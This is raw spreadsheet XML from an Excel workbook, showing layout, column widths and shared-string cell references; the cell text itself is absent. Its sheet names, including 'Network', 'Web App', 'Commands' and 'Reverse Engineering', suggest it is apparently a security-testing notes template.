  </sheetData>
  <phoneticPr fontId="3"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E3C73-22A5-4008-8739-F489AE5D585F}">
  <dimension ref="A1:K5"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="E16" sqref="E16"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="21.88671875" style="2" customWidth="1"/>
    <col min="2" max="4" width="15.77734375" style="2"/>
    <col min="5" max="5" width="30.109375" style="2" customWidth="1"/>
    <col min="6" max="6" width="19.77734375" style="2" customWidth="1"/>
    <col min="7" max="7" width="18" style="2" customWidth="1"/>
    <col min="8" max="8" width="47.88671875" style="2" customWidth="1"/>
    <col min="9" max="9" width="18.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="54.88671875" style="2" customWidth="1"/>
    <col min="11" max="11" width="38.44140625" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>12</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>13</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>14</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="3" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>71</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>57</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>58</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>59</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>67</v>
      </c>
      <c r="I2" s="5"/>
      <c r="J2" s="2" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>71</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>68</v>
      </c>
      <c r="H3" s="2" t="s">
        <v>70</v>
      </c>
      <c r="I3" s="5"/>
      <c r="J3" s="4" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1"/>
      <c r="E4" s="1"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1"/>
      <c r="J5" s="4"/>
    </row>
  </sheetData>
  <phoneticPr fontId="3"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3E388-0D5B-4574-B9C5-0C945BA9368E}">
  <dimension ref="A1:B38"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="A15" sqref="A15"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="175" style="6" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="18.44140625" style="2" customWidth="1"/>
    <col min="3" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>28</v>
      </c>
    </row>
    <row r="2" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="8" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="3" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="8" t="s">
        <v>73</v>
      </c>
    </row>
    <row r="4" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="6" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="6" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="6" t="s">
        <v>74</v>
      </c>
    </row>
    <row r="7" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="6" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="8" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="6" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="9" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="6" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="10" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="6" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="11" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="6" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="12" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="6" t="s">
        <v>27</v>
      </c>
    </row>
    <row r="13" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="6" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="14" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="6" t="s">
        <v>80</v>
      </c>
    </row>
    <row r="15" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="6" t="s">
        <v>47</v>
      </c>
    </row>
    <row r="16" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="6" t="s">
        <v>81</v>
      </c>
    </row>
    <row r="17" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="6" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="18" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="6" t="s">
        <v>83</v>
      </c>
    </row>
    <row r="19" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="6" t="s">
        <v>46</v>
      </c>
    </row>
    <row r="20" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="6" t="s">
        <v>84</v>
      </c>
    </row>
    <row r="21" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="6" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="22" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="6" t="s">
        <v>86</v>
      </c>
    </row>
    <row r="23" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="6" t="s">
        <v>87</v>
      </c>
    </row>
    <row r="24" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A24" s="6" t="s">
        <v>88</v>
      </c>
    </row>
    <row r="25" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A25" s="6" t="s">
        <v>89</v>
      </c>
    </row>
    <row r="26" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A26" s="6" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="27" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A27" s="6" t="s">
        <v>90</v>
      </c>
    </row>
    <row r="28" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" s="6" t="s">
        <v>91</v>
      </c>
    </row>
    <row r="29" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A29" s="6" t="s">
        <v>60</v>
      </c>
    </row>
    <row r="30" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A30" s="6" t="s">
        <v>61</v>
      </c>
    </row>
    <row r="31" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A31" s="6" t="s">
        <v>62</v>
      </c>
    </row>
    <row r="32" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A32" s="6" t="s">
        <v>63</v>
      </c>
    </row>
    <row r="33" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A33" s="6" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="34" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A34" s="6" t="s">
        <v>93</v>
      </c>
    </row>
    <row r="35" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A35" s="6" t="s">
        <v>94</v>
      </c>
    </row>
    <row r="36" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A36" s="6" t="s">
        <v>95</v>
      </c>
    </row>
    <row r="37" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A37" s="6" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="38" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A38" s="6" t="s">
        <v>92</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FAFEE-C3BA-4A05-9783-1ED877C22A62}">
  <dimension ref="A1:A2"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C9" sqref="C9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="5"/>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42D08-FB8B-4BAB-A462-7059BEE8513F}">
  <dimension ref="A1:D3"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C11" sqref="C11"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="12.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.5546875" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="15.5546875" style="1" customWidth="1"/>
    <col min="4" max="4" width="29.6640625" style="1" bestFit="1" customWidth="1"/>
    <col min="5" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:4" s="3" customFormat="1" x14ac:dyDescent="0.3">
      <c r="A1" s="3" t="s">
        <v>25</v>
      </c>
      <c r="B1" s="3" t="s">
        <v>24</v>
      </c>
      <c r="C1" s="3" t="s">
        <v>26</v>
      </c>
      <c r="D1" s="3" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="3" spans="1:4" x14ac:dyDescent="0.3">
      <c r="D3" s="2"/>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Network</vt:lpstr>
      <vt:lpstr>Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands</vt:lpstr>
      <vt:lpstr>Misc</vt:lpstr>
      <vt:lpstr>Reverse Engineering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2026-06-23T12:52:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-08T15:11:00Z</dcterms:modified>
</cp:coreProperties>
</file>